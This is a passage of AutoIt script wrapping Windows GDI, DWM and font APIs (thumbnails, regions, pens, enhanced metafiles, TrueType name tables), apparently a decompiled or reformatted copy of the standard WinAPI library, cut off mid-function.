    EndFunc    ; -> _WinAPI_DwmQueryThumbnailSourceSize

    Func _WinAPI_DwmRegisterThumbnail($hdestination, $hsource)
        Local $acall = DllCall("dwmapi.dll", "long", "DwmRegisterThumbnail", "hwnd", $hdestination, "hwnd", $hsource, "handle*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x3]
    EndFunc    ; -> _WinAPI_DwmRegisterThumbnail

    Func _WinAPI_DwmSetColorizationParameters($tdwmcp)
        Local $acall = DllCall("dwmapi.dll", "uint", 0x83, "struct*", $tdwmcp, "uint", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DwmSetColorizationParameters

    Func _WinAPI_DwmSetIconicLivePreviewBitmap($hwnd, $hbitmap, $bframe = False, $tclient = 0x0)
        Local $iflags
        If $bframe Then
            $iflags = 0x1
        Else
            $iflags = 0x0
        EndIf
        Local $acall = DllCall("dwmapi.dll", "uint", "DwmSetIconicLivePreviewBitmap", "hwnd", $hwnd, "handle", $hbitmap, "struct*", $tclient, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DwmSetIconicLivePreviewBitmap

    Func _WinAPI_DwmSetIconicThumbnail($hwnd, $hbitmap, $bframe = False)
        Local $iflags
        If $bframe Then
            $iflags = 0x1
        Else
            $iflags = 0x0
        EndIf
        Local $acall = DllCall("dwmapi.dll", "long", "DwmSetIconicThumbnail", "hwnd", $hwnd, "handle", $hbitmap, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DwmSetIconicThumbnail

    Func _WinAPI_DwmSetWindowAttribute($hwnd, $iattribute, $idata)
        Switch $iattribute
        Case 0x2, 0x3, 0x4, 0x6, 0x7, 0x8, 0xa, 0xb, 0xc
        Case Else
            Return SetError(0x1, 0x0, 0x0)
        EndSwitch
        Local $acall = DllCall("dwmapi.dll", "long", "DwmSetWindowAttribute", "hwnd", $hwnd, "dword", $iattribute, "dword*", $idata, "dword", 0x4)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DwmSetWindowAttribute

    Func _WinAPI_DwmUnregisterThumbnail($hthumbnail)
        Local $acall = DllCall("dwmapi.dll", "long", "DwmUnregisterThumbnail", "handle", $hthumbnail)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DwmUnregisterThumbnail

    Func _WinAPI_DwmUpdateThumbnailProperties($hthumbnail, $BVISIBLE = True, $bclientareaonly = False, $iopacity = 0xff, $trectdest = 0x0, $trectsrc = 0x0)
        Local Const $TAGDWM_THUMBNAIL_PROPERTIES = "struct;dword dwFlags;int rcDestination[4];int rcSource[4];byte opacity;bool opacity;bool fSourceClientAreaOnly;endstruct"
        Local $tthumbnailproperties = DllStructCreate($TAGDWM_THUMBNAIL_PROPERTIES)
        Local $tsize, $iflags = 0x0
        If Not IsDllStruct($trectdest) Then
            $tsize = _WinAPI_DwmQueryThumbnailSourceSize($hthumbnail)
            If @error Then
                Return SetError(@error + 0xa, @extended, 0x0)
            EndIf
            $trectdest = _WinAPI_CreateRectEx(0x0, 0x0, DllStructGetData($tsize, 0x1), DllStructGetData($tsize, 0x2))
        EndIf
        For $i = 0x1 To 0x4
            DllStructSetData($tthumbnailproperties, 0x2, DllStructGetData($trectdest, $i), $i)
        Next
        If IsDllStruct($trectsrc) Then
            $iflags += 0x2
            For $i = 0x1 To 0x4
                DllStructSetData($tthumbnailproperties, 0x3, DllStructGetData($trectsrc, $i), $i)
            Next
        EndIf
        DllStructSetData($tthumbnailproperties, 0x1, BitOR($iflags, 0x1d))
        DllStructSetData($tthumbnailproperties, 0x4, $iopacity)
        DllStructSetData($tthumbnailproperties, 0x5, $BVISIBLE)
        DllStructSetData($tthumbnailproperties, 0x6, $bclientareaonly)
        Local $acall = DllCall("dwmapi.dll", "long", "DwmUpdateThumbnailProperties", "handle", $hthumbnail, "struct*", $tthumbnailproperties)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DwmUpdateThumbnailProperties

    Func _WinAPI_Ellipse($hdc, $trect)
        Local $acall = DllCall("gdi32.dll", "bool", "Ellipse", "handle", $hdc, "int", DllStructGetData($trect, 0x1), "int", DllStructGetData($trect, 0x2), "int", DllStructGetData($trect, 0x3), "int", DllStructGetData($trect, 0x4))
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_Ellipse

    Func _WinAPI_EndPaint($hwnd, ByRef $tpaintstruct)
        Local $acall = DllCall("user32.dll", "bool", "EndPaint", "hwnd", $hwnd, "struct*", $tpaintstruct)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_EndPaint

    Func _WinAPI_EndPath($hdc)
        Local $acall = DllCall("gdi32.dll", "bool", "EndPath", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_EndPath

    Func _WinAPI_EnumDisplayMonitors($hdc = 0x0, $trect = 0x0)
        Local $henumproc = DllCallbackRegister("__EnumDisplayMonitorsProc", "bool", "handle;handle;ptr;lparam")
        Dim $__g_venum[0x65][0x2] = [[0x0]]
        Local $acall = DllCall("user32.dll", "bool", "EnumDisplayMonitors", "handle", $hdc, "struct*", $trect, "ptr", DllCallbackGetPtr($henumproc), "lparam", 0x0)
        If @error Or Not $acall[0x0] Or Not $__g_venum[0x0][0x0] Then
            $__g_venum = @error + 0xa
        EndIf
        DllCallbackFree($henumproc)
        If $__g_venum Then Return SetError($__g_venum, 0x0, 0x0)
        __Inc($__g_venum, + -1)
        Return $__g_venum
    EndFunc    ; -> _WinAPI_EnumDisplayMonitors

    Func _WinAPI_EnumDisplaySettings($sdevice, $imode)
        If Not StringStripWS($sdevice, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sdevice = Null
        Local $tdevmode = DllStructCreate($TAGDEVMODE_DISPLAY)
        DllStructSetData($tdevmode, "Size", DllStructGetSize($tdevmode))
        DllStructSetData($tdevmode, "DriverExtra", 0x0)
        Local $acall = DllCall("user32.dll", "bool", "EnumDisplaySettingsW", "wstr", $sdevice, "dword", $imode, "struct*", $tdevmode)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0x5]
        $aret[0x0] = DllStructGetData($tdevmode, "PelsWidth")
        $aret[0x1] = DllStructGetData($tdevmode, "PelsHeight")
        $aret[0x2] = DllStructGetData($tdevmode, "BitsPerPel")
        $aret[0x3] = DllStructGetData($tdevmode, "DisplayFrequency")
        $aret[0x4] = DllStructGetData($tdevmode, "DisplayFlags")
        Return $aret
    EndFunc    ; -> _WinAPI_EnumDisplaySettings

    Func _WinAPI_EnumFontFamilies($hdc = 0x0, $sfacename = '', $icharset = 0x1, $IFONTTYPE = 0x7, $spattern = '', $BEXCLUDE = False)
        Local $tlogfont = DllStructCreate($TAGLOGFONT)
        Local $tpattern = DllStructCreate("uint;uint;ptr;wchar[" & (StringLen($spattern) + 0x1) & "]")
        DllStructSetData($tpattern, 0x1, $IFONTTYPE)
        If Not $spattern Then
            DllStructSetData($tpattern, 0x2, 0x0)
            DllStructSetData($tpattern, 0x3, 0x0)
        Else
            DllStructSetData($tpattern, 0x2, $BEXCLUDE)
            DllStructSetData($tpattern, 0x3, DllStructGetPtr($tpattern, 0x4))
            DllStructSetData($tpattern, 0x4, $spattern)
        EndIf
        DllStructSetData($tlogfont, 0x9, $icharset)
        DllStructSetData($tlogfont, 0xd, 0x0)
        DllStructSetData($tlogfont, 0xe, StringLeft($sfacename, 0x1f))
        Local $hcdc
        If Not $hdc Then
            $hcdc = _WinAPI_CreateCompatibleDC(0x0)
        Else
            $hcdc = $hdc
        EndIf
        Dim $__g_venum[0x65][0x8] = [[0x0]]
        Local $henumproc = DllCallbackRegister("__EnumFontFamiliesProc", "int", "ptr;ptr;dword;PTR")
        Local $acall = DllCall("gdi32.dll", "int", "EnumFontFamiliesExW", "handle", $hcdc, "struct*", $tlogfont, "ptr", DllCallbackGetPtr($henumproc), "struct*", $tpattern, "dword", 0x0)
        If @error Or Not $acall[0x0] Or Not $__g_venum[0x0][0x0] Then
            $__g_venum = @error + 0xa
        EndIf
        DllCallbackFree($henumproc)
        If Not $hdc Then
            _WinAPI_DeleteDC($hcdc)
        EndIf
        If $__g_venum Then Return SetError($__g_venum, 0x0, 0x0)
        __Inc($__g_venum, + -1)
        Return $__g_venum
    EndFunc    ; -> _WinAPI_EnumFontFamilies

    Func _WinAPI_EqualRect($trect1, $trect2)
        Local $acall = DllCall("user32.dll", "bool", "EqualRect", "struct*", $trect1, "struct*", $trect2)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_EqualRect

    Func _WinAPI_EqualRgn($hrgn1, $hrgn2)
        Local $acall = DllCall("gdi32.dll", "bool", "EqualRgn", "handle", $hrgn1, "handle", $hrgn2)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_EqualRgn

    Func _WinAPI_ExcludeClipRect($hdc, $trect)
        Local $acall = DllCall("gdi32.dll", "int", "ExcludeClipRect", "handle", $hdc, "int", DllStructGetData($trect, 0x1), "int", DllStructGetData($trect, 0x2), "int", DllStructGetData($trect, 0x3), "int", DllStructGetData($trect, 0x4))
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ExcludeClipRect

    Func _WinAPI_ExtCreatePen($ipenstyle, $iwidth, $ibrushstyle, $irgb, $ihatch = 0x0, $auserstyle = 0x0, $ISTART = 0x0, $IEND = + -1)
        Local $icount = 0x0, $tstyle = 0x0
        If BitAND($ipenstyle, 0xff) = 0x7 Then
            If __CheckErrorArrayBounds($auserstyle, $ISTART, $IEND) Then Return SetError(@error + 0xa, @extended, 0x0)
            $tstyle = DllStructCreate("dword[" & ($IEND - $ISTART + 0x1) & "]")
            For $i = $ISTART To $IEND
                DllStructSetData($tstyle, 0x1, $auserstyle[$i], $icount + 0x1)
                $icount += 0x1
            Next
        EndIf
        Local $tlogbrush = DllStructCreate($TAGLOGBRUSH)
        DllStructSetData($tlogbrush, 0x1, $ibrushstyle)
        DllStructSetData($tlogbrush, 0x2, __rgb($irgb))
        DllStructSetData($tlogbrush, 0x3, $ihatch)
        Local $acall = DllCall("gdi32.dll", "handle", "ExtCreatePen", "dword", $ipenstyle, "dword", $iwidth, "struct*", $tlogbrush, "dword", $icount, "struct*", $tstyle)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ExtCreatePen

    Func _WinAPI_ExtCreateRegion($trgndata, $txform = 0x0)
        Local $acall = DllCall("gdi32.dll", "handle", "ExtCreateRegion", "struct*", $txform, "dword", DllStructGetSize($trgndata), "struct*", $trgndata)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ExtCreateRegion

    Func _WinAPI_ExtFloodFill($hdc, $ix, $iy, $irgb, $itype = 0x0)
        Local $acall = DllCall("gdi32.dll", "bool", "ExtFloodFill", "handle", $hdc, "int", $ix, "int", $iy, "dword", __rgb($irgb), "uint", $itype)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ExtFloodFill

    Func _WinAPI_ExtSelectClipRgn($hdc, $hrgn, $imode = 0x5)
        Local $acall = DllCall("gdi32.dll", "int", "ExtSelectClipRgn", "handle", $hdc, "handle", $hrgn, "int", $imode)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ExtSelectClipRgn

    Func _WinAPI_FillPath($hdc)
        Local $acall = DllCall("gdi32.dll", "bool", "FillPath", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FillPath

    Func _WinAPI_FillRgn($hdc, $hrgn, $hbrush)
        Local $acall = DllCall("gdi32.dll", "bool", "FillRgn", "handle", $hdc, "handle", $hrgn, "handle", $hbrush)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FillRgn

    Func _WinAPI_FlattenPath($hdc)
        Local $acall = DllCall("gdi32.dll", "bool", "FlattenPath", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FlattenPath

    Func _WinAPI_FrameRgn($hdc, $hrgn, $hbrush, $iwidth, $iheight)
        Local $acall = DllCall("gdi32.dll", "bool", "FrameRgn", "handle", $hdc, "handle", $hrgn, "handle", $hbrush, "int", $iwidth, "int", $iheight)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FrameRgn

    Func _WinAPI_GdiComment($hdc, $pbuffer, $isize)
        Local $acall = DllCall("gdi32.dll", "bool", "GdiComment", "handle", $hdc, "uint", $isize, "struct*", $pbuffer)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GdiComment

    Func _WinAPI_GetArcDirection($hdc)
        Local $acall = DllCall("gdi32.dll", "int", "GetArcDirection", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, 0x0)
        If ($acall[0x0] < 0x1) Or ($acall[0x0] > 0x2) Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetArcDirection

    Func _WinAPI_GetBitmapBits($hbitmap, $isize, $pbits)
        Local $acall = DllCall("gdi32.dll", "long", "GetBitmapBits", "handle", $hbitmap, "long", $isize, "struct*", $pbits)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetBitmapBits

    Func _WinAPI_GetBitmapDimensionEx($hbitmap)
        Local $tsize = DllStructCreate($TAGSIZE)
        Local $acall = DllCall("gdi32.dll", "bool", "GetBitmapDimensionEx", "handle", $hbitmap, "struct*", $tsize)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tsize
    EndFunc    ; -> _WinAPI_GetBitmapDimensionEx

    Func _WinAPI_GetBkColor($hdc)
        Local $acall = DllCall("gdi32.dll", "dword", "GetBkColor", "handle", $hdc)
        If @error Or ($acall[0x0] = + -1) Then Return SetError(@error, @extended, + -1)
        Return __rgb($acall[0x0])
    EndFunc    ; -> _WinAPI_GetBkColor

    Func _WinAPI_GetBoundsRect($hdc, $iflags = 0x0)
        Local $trect = DllStructCreate($TAGRECT)
        Local $acall = DllCall("gdi32.dll", "uint", "GetBoundsRect", "handle", $hdc, "struct*", $trect, "uint", $iflags)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return SetExtended($acall[0x0], $trect)
    EndFunc    ; -> _WinAPI_GetBoundsRect

    Func _WinAPI_GetBrushOrg($hdc)
        Local $tpoint = DllStructCreate($TAGPOINT)
        Local $acall = DllCall("gdi32.dll", "bool", "GetBrushOrgEx", "handle", $hdc, "struct*", $tpoint)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tpoint
    EndFunc    ; -> _WinAPI_GetBrushOrg

    Func _WinAPI_GetBValue($irgb)
        Return BitShift(BitAND(__rgb($irgb), 0xff0000), 0x10)
    EndFunc    ; -> _WinAPI_GetBValue

    Func _WinAPI_GetClipBox($hdc, ByRef $trect)
        $trect = DllStructCreate($TAGRECT)
        Local $acall = DllCall("gdi32.dll", "int", "GetClipBox", "handle", $hdc, "struct*", $trect)
        If @error Or Not $acall[0x0] Then
            $trect = 0x0
            Return SetError(@error, @extended, 0x0)
        EndIf
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetClipBox

    Func _WinAPI_GetClipRgn($hdc)
        Local $hrgn = _WinAPI_CreateRectRgn(0x0, 0x0, 0x0, 0x0)
        Local $ierror = 0x0
        Local $acall = DllCall("gdi32.dll", "int", "GetClipRgn", "handle", $hdc, "handle", $hrgn)
        If @error Or ($acall[0x0] = + -1) Then $ierror = @error + 0xa
        If $ierror Or Not $acall[0x0] Then
            _WinAPI_DeleteObject($hrgn)
            $hrgn = 0x0
        EndIf
        Return SetError($ierror, 0x0, $hrgn)
    EndFunc    ; -> _WinAPI_GetClipRgn

    Func _WinAPI_GetColorAdjustment($hdc)
        Local $tadjustment = DllStructCreate($TAGCOLORADJUSTMENT)
        Local $acall = DllCall("gdi32.dll", "bool", "GetColorAdjustment", "handle", $hdc, "struct*", $tadjustment)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tadjustment
    EndFunc    ; -> _WinAPI_GetColorAdjustment

    Func _WinAPI_GetCurrentPosition($hdc)
        Local $tpoint = DllStructCreate($TAGPOINT)
        Local $acall = DllCall("gdi32.dll", "int", "GetCurrentPositionEx", "handle", $hdc, "struct*", $tpoint)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tpoint
    EndFunc    ; -> _WinAPI_GetCurrentPosition

    Func _WinAPI_GetDeviceGammaRamp($hdc, ByRef $aramp)
        $aramp = 0x0
        Local $tdata = DllStructCreate("word[256];word[256];word[256]")
        Local $acall = DllCall("gdi32.dll", "bool", "GetDeviceGammaRamp", "handle", $hdc, "struct*", $tdata)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Dim $aramp[0x100][0x3]
        For $i = 0x0 To 0x2
            For $j = 0x0 To 0xff
                $aramp[$j][$i] = DllStructGetData($tdata, $i + 0x1, $j + 0x1)
            Next
        Next
        Return 0x1
    EndFunc    ; -> _WinAPI_GetDeviceGammaRamp

    Func _WinAPI_GetDIBColorTable($hbitmap)
        Local $hdc = _WinAPI_CreateCompatibleDC(0x0)
        Local $hsv = _WinAPI_SelectObject($hdc, $hbitmap)
        Local $tpeak = DllStructCreate("dword[256]")
        Local $ierror = 0x0
        Local $acall = DllCall("gdi32.dll", "uint", "GetDIBColorTable", "handle", $hdc, "uint", 0x0, "uint", 0x100, "struct*", $tpeak)
        If @error Or Not $acall[0x0] Then $ierror = @error + 0xa
        _WinAPI_SelectObject($hdc, $hsv)
        _WinAPI_DeleteDC($hdc)
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Local $tdata = DllStructCreate("dword[" & $acall[0x0] & "]")
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        _WinAPI_MoveMemory($tdata, $acall[0x4], 0x4 * $acall[0x0])
        Return SetExtended($acall[0x0], $tdata)
    EndFunc    ; -> _WinAPI_GetDIBColorTable

    Func _WinAPI_GetDIBits($hdc, $hbitmap, $istartscan, $iscanlines, $pbits, $tbi, $iusage)
        Local $acall = DllCall("gdi32.dll", "int", "GetDIBits", "handle", $hdc, "handle", $hbitmap, "uint", $istartscan, "uint", $iscanlines, "struct*", $pbits, "struct*", $tbi, "uint", $iusage)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetDIBits

    Func _WinAPI_GetEnhMetaFile($sfilepath)
        Local $acall = DllCall("gdi32.dll", "handle", "GetEnhMetaFileW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetEnhMetaFile

    Func _WinAPI_GetEnhMetaFileBits($hemf, ByRef $pbuffer)
        Local $acall = DllCall("gdi32.dll", "uint", "GetEnhMetaFileBits", "handle", $hemf, "uint", 0x0, "ptr", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0x32, @extended, 0x0)
        $pbuffer = __HeapReAlloc($pbuffer, $acall[0x0], 0x1)
        If @error Then Return SetError(@error, @extended, 0x0)
        $acall = DllCall("gdi32.dll", "uint", "GetEnhMetaFileBits", "handle", $hemf, "uint", $acall[0x0], "ptr", $pbuffer)
        If Not $acall[0x0] Then Return SetError(0x3c, 0x0, 0x0)
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetEnhMetaFileBits

    Func _WinAPI_GetEnhMetaFileDescription($hemf)
        Local $tdata = DllStructCreate("wchar[4096]")
        Local $acall = DllCall("gdi32.dll", "uint", "GetEnhMetaFileDescriptionW", "handle", $hemf, "uint", 0x1000, "struct*", $tdata)
        If @error Or ($acall[0x0] = -1) Then Return SetError(@error + 0x14, $acall[0x0], 0x0)
        If Not $acall[0x0] Then Return 0x0
        Local $ADATA = _WinAPI_StructToArray($tdata)
        If @error Then Return SetError(@error, @extended, 0x0)
        Local $aret[0x2]
        For $i = 0x0 To 0x1
            If $ADATA[0x0] > $i Then
                $aret[$i] = $ADATA[$i + 0x1]
            Else
                $aret[$i] = ''
            EndIf
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetEnhMetaFileDescription

    Func _WinAPI_GetEnhMetaFileDimension($hemf)
        Local $tenhmetaheader = _WinAPI_GetEnhMetaFileHeader($hemf)
        If @error Then Return SetError(@error, @extended, 0x0)
        Local $tsize = DllStructCreate($TAGSIZE)
        DllStructSetData($tsize, 0x1, Round((DllStructGetData($tenhmetaheader, "rcFrame", 0x3) - DllStructGetData($tenhmetaheader, "rcFrame", 0x1)) * DllStructGetData($tenhmetaheader, "Device", 0x1) / DllStructGetData($tenhmetaheader, "Millimeters", 0x1) / 0x64))
        DllStructSetData($tsize, 0x2, Round((DllStructGetData($tenhmetaheader, "rcFrame", 0x4) - DllStructGetData($tenhmetaheader, "rcFrame", 0x2)) * DllStructGetData($tenhmetaheader, "Device", 0x2) / DllStructGetData($tenhmetaheader, "Millimeters", 0x2) / 0x64))
        Return $tsize
    EndFunc    ; -> _WinAPI_GetEnhMetaFileDimension

    Func _WinAPI_GetEnhMetaFileHeader($hemf)
        Local $tenhmetaheader = DllStructCreate($TAGENHMETAHEADER)
        Local $acall = DllCall("gdi32.dll", "uint", "GetEnhMetaFileHeader", "handle", $hemf, "uint", DllStructGetSize($tenhmetaheader), "struct*", $tenhmetaheader)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return SetExtended($acall[0x0], $tenhmetaheader)
    EndFunc    ; -> _WinAPI_GetEnhMetaFileHeader

    Func _WinAPI_GetFontName($sfacename, $istyle = 0x0, $icharset = 0x1)
        If Not $sfacename Then Return SetError(0x1, 0x0, '')
        Local $iflags = 0x0
        If BitAND($istyle, 0x1) Then
            $iflags += 0x20
        EndIf
        If BitAND($istyle, 0x2) Then
            $iflags += 0x1
        EndIf
        If Not $iflags Then
            $iflags = 0x40
        EndIf
        Local $tlogfont = DllStructCreate($TAGLOGFONT)
        DllStructSetData($tlogfont, 0x9, $icharset)
        DllStructSetData($tlogfont, 0xd, 0x0)
        DllStructSetData($tlogfont, 0xe, StringLeft($sfacename, 0x1f))
        Local $tfn = DllStructCreate("dword;wchar[64]")
        DllStructSetData($tfn, 0x1, $iflags)
        DllStructSetData($tfn, 0x2, '')
        Local $hdc = _WinAPI_CreateCompatibleDC(0x0)
        Local $henumproc = DllCallbackRegister("__EnumFontStylesProc", "int", "ptr;ptr;dword;lparam")
        Local $sret = ''
        Local $acall = DllCall("gdi32.dll", "int", "EnumFontFamiliesExW", "handle", $hdc, "struct*", $tlogfont, "ptr", DllCallbackGetPtr($henumproc), "struct*", $tfn, "dword", 0x0)
        If Not @error And Not $acall[0x0] Then $sret = DllStructGetData($tfn, 0x2)
        DllCallbackFree($henumproc)
        _WinAPI_DeleteDC($hdc)
        If Not $sret Then Return SetError(0x2, 0x0, '')
        Return $sret
    EndFunc    ; -> _WinAPI_GetFontName

    Func _WinAPI_GetFontResourceInfo($sfont, $bforce = False, $iflag = Default)
        If $iflag = Default Then
            If $bforce Then
                If Not _WinAPI_AddFontResourceEx($sfont, $FR_NOT_ENUM) Then Return SetError(@error + 0x14, @extended, '')
            EndIf
            Local $ierror = 0x0
            Local $aret = DllCall("gdi32.dll", "bool", "GetFontResourceInfoW", "wstr", $sfont, "dword*", 0x1000, "wstr", '', "dword", 0x1)
            If @error Or Not $aret[0x0] Then $ierror = @error + 0xa
            If $bforce Then
                _WinAPI_RemoveFontResourceEx($sfont, $FR_NOT_ENUM)
            EndIf
            If $ierror Then Return SetError($ierror, 0x0, '')
            Return $aret[0x3]
        Else
            If Not FileExists($sfont) Then
                $sfont = RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", "Fonts") & "\\" & $sfont
                If Not FileExists($sfont) Then Return SetError(0x1f, 0x0, '')
            EndIf
            Local Const $hfile = _WinAPI_CreateFile($sfont, 0x2, 0x2, 0x2)
            If Not $hfile Then Return SetError(0x20, _WinAPI_GetLastError(), '')
            Local Const $IFILE = FileGetSize($sfont)
            Local Const $tbuffer = DllStructCreate("byte[" & $IFILE + 0x1 & "]")
            Local Const $PFILE = DllStructGetPtr($tbuffer)
            Local $iread
            _WinAPI_ReadFile($hfile, $PFILE, $IFILE, $iread)
            _WinAPI_CloseHandle($hfile)
            Local $sttfname = _WinAPI_GetFontMemoryResourceInfo($PFILE, $iflag)
            If @error Then
                If @error = 0x1 Then
                    $sttfname = _WinAPI_GetFontResourceInfo($sfont, True)
                    Return SetError(@error, @extended, $sttfname)
                EndIf
                Return SetError(0x21, @error, '')
            EndIf
            Return $sttfname
        EndIf
    EndFunc    ; -> _WinAPI_GetFontResourceInfo

    Func _WinAPI_GetFontMemoryResourceInfo($pmemory, $iflag = 0x1)
        Local Const $TAGTT_OFFSET_TABLE = "USHORT uMajorVersion;USHORT uMinorVersion;USHORT uNumOfTables;USHORT uSearchRange;USHORT uEntrySelector;USHORT uRangeShift"
        Local Const $TAGTT_TABLE_DIRECTORY = "char szTag[4];ULONG uCheckSum;ULONG uOffset;ULONG uLength"
        Local Const $TAGTT_NAME_TABLE_HEADER = "USHORT uFSelector;USHORT uNRCount;USHORT uStorageOffset"
        Local Const $TAGTT_NAME_RECORD = "USHORT uPlatformID;USHORT uEncodingID;USHORT uLanguageID;USHORT uNameID;USHORT uStringLength;USHORT uStringOffset"
        Local $tttoffsettable = DllStructCreate($TAGTT_OFFSET_TABLE, $pmemory)
        Local $inumoftables = _WinAPI_SwapWord(DllStructGetData($tttoffsettable, "uNumOfTables"))
        If Not (_WinAPI_SwapWord(DllStructGetData($tttoffsettable, "uMajorVersion")) = 0x1 And _WinAPI_SwapWord(DllStructGetData($tttoffsettable, "uMinorVersion")) = 0x0) Then Return SetError(0x1, 0x0, '')
        Local $itbldirsize = DllStructGetSize(DllStructCreate($TAGTT_TABLE_DIRECTORY))
        Local $bfound = False, $ioffset, $ttbldir
        For $i = 0x0 To $inumoftables + -1
            $ttbldir = DllStructCreate($TAGTT_TABLE_DIRECTORY, $pmemory + DllStructGetSize($tttoffsettable) + $i * $itbldirsize)
            If StringLeft(DllStructGetData($ttbldir, "szTag"), 0x4) = "name" Then
                $bfound = True
                $ioffset = _WinAPI_SwapDWord(DllStructGetData($ttbldir, "uOffset"))
                ExitLoop
            EndIf
        Next
        If Not $bfound Then Return SetError(0x2, 0x0, '')
        Local $tntheader = DllStructCreate($TAGTT_NAME_TABLE_HEADER, $pmemory + $ioffset)
        Local $intheadersize = DllStructGetSize($tntheader)
        Local $inrcount = _WinAPI_SwapWord(DllStructGetData($tntheader, "uNRCount"))
        Local $istorageoffset = _WinAPI_SwapWord(DllStructGetData($tntheader, "uStorageOffset"))
        Local $ittrecordsize = DllStructGetSize(DllStructCreate($TAGTT_NAME_RECORD))
        Local $tresult, $sresult, $istringlength = 0x0, $istringoffset, $iencodingid, $tttrecord
        For $i = 0x0 To $inrcount + -1
            $tttrecord = DllStructCreate($TAGTT_NAME_RECORD, $pmemory + $ioffset + $intheadersize + $i * $ittrecordsize)
            If @error Then ContinueLoop
            If _WinAPI_SwapWord($tttrecord.uNameID) = $iflag Then
                $istringlength = _WinAPI_SwapWord(DllStructGetData($tttrecord, "uStringLength"))
                $istringoffset = _WinAPI_SwapWord(DllStructGetData($tttrecord, "uStringOffset"))
                $iencodingid = _WinAPI_SwapWord(DllStructGetData($tttrecord, "uEncodingID"))
                Local $swchar = "char"
                If $iencodingid = 0x1 Then
                    $swchar = "word"
                    $istringlength /= 0x2
                EndIf
                If Not $istringlength Then
                    $sresult = ''
                    ContinueLoop
                EndIf
                $tresult = DllStructCreate($swchar & " szTTFName[" & $istringlength & "]", $pmemory + $ioffset + $istringoffset + $istorageoffset)
                If $iencodingid = 0x1 Then
                    $sresult = ''
                    For $j = 0x1 To $istringlength
                        $sresult &= ChrW(_WinAPI_SwapWord(DllStructGetData($tresult, 0x1, $j)))
                    Next
                Else
                    $sresult = $tresult.szTTFName
                EndIf
                If StringLen($sresult) > 0x0 Then ExitLoop
            EndIf
        Next
        Return $sresult
    EndFunc    ; -> _WinAPI_GetFontMemoryResourceInfo

    Func _WinAPI_GetGlyphOutline($hdc, $schar, $iformat, ByRef $pbuffer, $tmat2 = 0x0)
